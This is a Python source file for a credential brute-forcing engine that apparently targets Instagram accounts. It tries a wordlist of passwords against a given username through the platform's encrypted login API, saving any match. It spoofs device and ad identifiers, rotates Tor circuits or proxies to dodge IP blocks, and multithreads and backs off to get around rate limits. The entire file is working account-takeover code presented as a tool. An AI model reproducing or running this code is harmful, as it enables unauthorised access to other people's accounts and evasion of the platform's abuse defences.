import time
import threading
import json
import os
from concurrent.futures import ThreadPoolExecutor, as_completed

import config
from config import (
    BATCH_SIZE, BACKOFF_INITIAL, BACKOFF_MAX,
    DELAY_BETWEEN_BATCHES, IG_SIG,
)
from api import login_request, healthcheck, fetch_public_key
from crypto import encrypt_password
from utils import Color, save_found, save_nottested, log_debug
from tor import rotate_tor


class BruteEngine:
    def __init__(self, username, wordlist, mode, debug, proxy=None, threads=1, port_assignments=None):
        self.username = username
        self.wordlist = wordlist
        self.mode = mode
        self.debug = debug
        self.proxy = proxy
        self.threads = threads
        self.port_assignments = port_assignments or {}
        self.found = False
        self.backoff = 0
        self.lock = threading.Lock()
        self.total_tried = 0

        from config import generate_device_id, generate_phone_id, generate_guid, generate_adid
        self.device_id = generate_device_id()
        self.phone_id = generate_phone_id()
        self.guid = generate_guid()
        self.adid = generate_adid()

    def _get_proxy(self, thread_id):
        if self.mode == "tor" and thread_id in self.port_assignments:
            return f"socks5h://127.0.0.1:{self.port_assignments[thread_id]}"
        elif self.mode == "proxy" and self.proxy:
            return self.proxy
        return None

    def _try_password(self, password, line_num, total, thread_label, key_id, pubkey, thread_id=0):
        if self.found:
            return

        enc_pass = encrypt_password(password, key_id, pubkey)
        proxy = self._get_proxy(thread_id)

        status_code, body = login_request(
            self.username, enc_pass, self.phone_id,
            self.adid, self.guid, self.device_id, proxy
        )

        response = body if isinstance(body, str) else ""

        if self.debug:
            log_debug(f"[{thread_label}] {password} -> {status_code}: {response[:200]}", True)

        result = "unknown"
        if status_code == 429:
            result = "rate_limited"
        elif any(x in response for x in ["challenge", "checkpoint_required"]):
            result = "challenge"
        elif '"200"' in response or '"status": "ok"' in response or status_code == 200:
            if "bad_password" not in response and "invalid_password" not in response:
                result = "found"
        elif "bad_password" in response or "invalid_password" in response:
            result = "wrong"
        elif "doesn't appear" in response:
            result = "username_not_found"
        elif "Please wait" in response or "many tries" in response:
            result = "rate_limited"
        elif "login_required" in response:
            result = "login_required"

        with self.lock:
            self.total_tried += 1

            if result == "found":
                self.found = True
                print(f"\n{Color.GREEN} [*] Password Found: {password}{Color.RESET}")
                save_found(self.username, password)
                print(f"{Color.GREEN} [*] Saved: found.passwords {Color.RESET}")
                return True

            elif result == "challenge":
                self.found = True
                print(f"\n{Color.GREEN} [*] Password Found: {password}{Color.RESET}")
                print(f"{Color.GREEN} [*] Challenge/Checkpoint required{Color.RESET}")
                save_found(self.username, password)
                print(f"{Color.GREEN} [*] Saved: found.passwords {Color.RESET}")
                return True

            elif result == "rate_limited":
                print(f"{Color.RED}  [!] Rate limited on {thread_label}, saving: {password}{Color.RESET}")
                save_nottested(password)
                self.backoff += 1

            elif result == "username_not_found":
                print(f"{Color.RED}  [!] Username not found, skipping: {password}{Color.RESET}")

            elif result == "unknown":
                print(f"{Color.RED}  [!] No match on {thread_label}, saving: {password}{Color.RESET}")
                save_nottested(password)
                if self.debug:
                    print(f"{Color.YELLOW}  [DEBUG] Raw: {response[:200]}{Color.RESET}")

            elif result == "wrong":
                print(f"{Color.GRAY}[{thread_label}] Trying pass ({line_num}/{total}): {password} {Color.RED}wrong{Color.RESET}")

            else:
                print(f"{Color.GRAY}[{thread_label}] Trying pass ({line_num}/{total}): {password} {Color.YELLOW}{result}{Color.RESET}")

        return False

    def _worker_batch(self, passwords, start_idx, total, thread_id, key_id, pubkey):
        thread_label = f"T{thread_id+1}"
        for i, password in enumerate(passwords):
            if self.found:
                return
            line_num = start_idx + i
            found = self._try_password(password, line_num, total, thread_label, key_id, pubkey, thread_id)
            if found:
                return
            time.sleep(config.REQUEST_DELAY)

    def run(self):
        print(f"{Color.GREEN}[*] Fetching encryption keys...{Color.RESET}")
        key_id, pubkey = fetch_public_key(self.proxy, self.debug)
        if key_id is None:
            print(f"{Color.RED}[!] Could not fetch encryption keys. Aborting.{Color.RESET}")
            return False

        print(f"{Color.GREEN}[*] Encryption key ID: {Color.GRAY}{key_id}{Color.RESET}")
        print(f"{Color.GREEN}[*] Ad ID: {Color.GRAY}{self.adid}{Color.RESET}")

        print(f"{Color.GREEN}[*] Running API health check...{Color.RESET}")
        hc_code, hc_body = healthcheck(
            self.username, self.phone_id, self.adid, self.guid, self.device_id, self.proxy
        )
        if hc_code == 429:
            print(f"{Color.RED}[!] Health check FAILED: IP is blocked (HTTP 429){Color.RESET}")
            return False
        else:
            print(f"{Color.GREEN}[+] Health check result: HTTP {hc_code}{Color.RESET}")

        with open(self.wordlist, "r", encoding="utf-8", errors="ignore") as f:
            all_passwords = [line.strip() for line in f if line.strip()]

        total = len(all_passwords)
        print(f"{Color.GREEN}Username:{Color.GRAY} {self.username}{Color.RESET}")
        print(f"{Color.GREEN}Wordlist:{Color.GRAY} {self.wordlist} ({total} passwords){Color.RESET}")
        print(f"{Color.GREEN}Mode:{Color.GRAY} {self.mode}{Color.RESET}")
        print(f"{Color.GREEN}Threads:{Color.GRAY} {self.threads}{Color.RESET}")
        print(f"{Color.RED}[*] Press Ctrl + C to stop or save session{Color.RESET}")

        start_idx = 0
        try:
            while start_idx < total and not self.found:
                if self.mode == "tor":
                    rotate_tor()

                end_idx = min(start_idx + BATCH_SIZE, total)
                batch = all_passwords[start_idx:end_idx]

                if self.threads <= 1:
                    self._worker_batch(batch, start_idx + 1, total, 0, key_id, pubkey)
                else:
                    chunk_size = max(1, len(batch) // self.threads)
                    chunks = []
                    for t in range(self.threads):
                        chunk_start = t * chunk_size
                        chunk_end = chunk_start + chunk_size if t < self.threads - 1 else len(batch)
                        if chunk_start < len(batch):
                            chunks.append((batch[chunk_start:chunk_end], start_idx + 1 + chunk_start, t))

                    with ThreadPoolExecutor(max_workers=self.threads) as executor:
                        futures = []
                        for chunk_batch, chunk_start, thread_id in chunks:
                            futures.append(
                                executor.submit(self._worker_batch, chunk_batch, chunk_start, total, thread_id, key_id, pubkey)
                            )
                        for f in as_completed(futures):
                            try:
                                f.result()
                            except Exception:
                                pass

                if self.backoff > 0:
                    delay = min(BACKOFF_INITIAL * self.backoff, BACKOFF_MAX)
                    print(f"{Color.RED}[*] Rate limited {self.backoff} times. Backing off {delay}s...{Color.RESET}")
                    time.sleep(delay)
                    self.backoff = 0

                start_idx += BATCH_SIZE

                if DELAY_BETWEEN_BATCHES > 0:
                    time.sleep(DELAY_BETWEEN_BATCHES)

        except KeyboardInterrupt:
            print(f"\n{Color.RED}[*] Interrupted by user{Color.RESET}")
            return False

        return self.found

    def run_test(self):
        print(f"{Color.GREEN}[*] Fetching encryption keys...{Color.RESET}")
        key_id, pubkey = fetch_public_key(self.proxy, self.debug)
        if key_id is None:
            print(f"{Color.RED}[!] Could not fetch encryption keys. Aborting.{Color.RESET}")
            return False

        print(f"{Color.GREEN}[*] Encryption key ID: {Color.GRAY}{key_id}{Color.RESET}")
        print(f"{Color.GREEN}[*] Ad ID: {Color.GRAY}{self.adid}{Color.RESET}")

        print(f"{Color.GREEN}[*] Running API health check...{Color.RESET}")
        hc_code, hc_body = healthcheck(
            self.username, self.phone_id, self.adid, self.guid, self.device_id, self.proxy
        )
        print(f"{Color.GREEN}[*] Health check result: HTTP {hc_code}{Color.RESET}")

        print(f"{Color.GREEN}[*] Test Mode - trying passwords one by one{Color.RESET}")
        print(f"{Color.GREEN}[*] Username: {Color.GRAY}{self.username}{Color.RESET}")
        print(f"{Color.GREEN}[*] Wordlist: {Color.GRAY}{self.wordlist}{Color.RESET}")
        print(f"{Color.RED}[*] Press Ctrl + C to stop{Color.RESET}")

        with open(self.wordlist, "r", encoding="utf-8", errors="ignore") as f:
            all_passwords = [line.strip() for line in f if line.strip()]

        total = len(all_passwords)
        proxy = self._get_proxy(0)

        for i, password in enumerate(all_passwords):
            if self.found:
                break

            enc_pass = encrypt_password(password, key_id, pubkey)

            status_code, body = login_request(
                self.username, enc_pass, self.phone_id,
                self.adid, self.guid, self.device_id, proxy
            )

            response = body if isinstance(body, str) else ""

            if self.debug:
                log_debug(f"[T] {password} -> {status_code}: {response[:200]}", True)

            result = "unknown"
            if status_code == 429:
                result = "rate_limited"
            elif any(x in response for x in ["challenge", "checkpoint_required"]):
                result = "challenge"
            elif '"200"' in response or '"status": "ok"' in response or status_code == 200:
                if "bad_password" not in response and "invalid_password" not in response:
                    result = "found"
            elif "bad_password" in response or "invalid_password" in response:
                result = "wrong"
            elif "doesn't appear" in response:
                result = "username_not_found"
            elif "Please wait" in response or "many tries" in response:
                result = "rate_limited"

            print(f"{Color.GRAY}[T] Trying pass ({i+1}/{total}): {password} ", end="")

            if result == "found":
                print(f"{Color.GREEN}FOUND!{Color.RESET}")
                print(f"{Color.GREEN}[*] Password: {password}{Color.RESET}")
                save_found(self.username, password)
                print(f"{Color.GREEN}[*] Saved to found.passwords{Color.RESET}")
                return True
            elif result == "challenge":
                print(f"{Color.GREEN}FOUND! (challenge){Color.RESET}")
                print(f"{Color.GREEN}[*] Password: {password}{Color.RESET}")
                save_found(self.username, password)
                print(f"{Color.GREEN}[*] Saved to found.passwords{Color.RESET}")
                return True
            elif result == "wrong":
                print(f"{Color.RED}wrong{Color.RESET}")
            elif result == "username_not_found":
                print(f"{Color.RED}username not found{Color.RESET}")
            elif result == "rate_limited":
                print(f"{Color.YELLOW}rate-limited, waiting 60s...{Color.RESET}")
                time.sleep(60)
            else:
                print(f"{Color.YELLOW}unknown response{Color.RESET}")

            time.sleep(config.REQUEST_DELAY)

        print(f"{Color.RED}[*] Wordlist exhausted. Password not found.{Color.RESET}")
        return False
